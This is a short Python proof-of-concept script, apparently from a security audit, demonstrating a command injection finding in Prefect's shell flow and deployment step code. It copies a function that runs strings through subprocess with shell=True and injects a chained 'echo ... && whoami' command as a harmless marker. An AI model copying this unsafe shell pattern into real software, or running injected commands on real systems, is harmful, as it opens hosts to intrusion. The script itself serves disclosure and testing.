"""
PoC: MEDIUM - Command Injection in Shell Flow and Deployment Step
Location 1: src/prefect/cli/shell.py:76 (run_shell_process)
Location 2: src/prefect/deployments/steps/utility.py:233 (run_shell_script)
"""
import subprocess
import sys


def run_shell_process(command: str):
    """Vulnerable function from src/prefect/cli/shell.py:39"""
    kwargs = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "shell": True,
        "text": True,
        "bufsize": 1,
        "universal_newlines": True,
    }
    with subprocess.Popen(command, **kwargs) as proc:
        stdout, stderr = proc.communicate()
        print(f"[stdout] {stdout.strip()}")
        print(f"[stderr] {stderr.strip()}")
        return proc.returncode


if __name__ == "__main__":
    # Attacker-controlled command injected into shell flow
    malicious_command = 'echo SHELL_INJECTION_CONFIRMED && whoami'
    print(f"[*] Executing: {malicious_command}")
    run_shell_process(malicious_command)
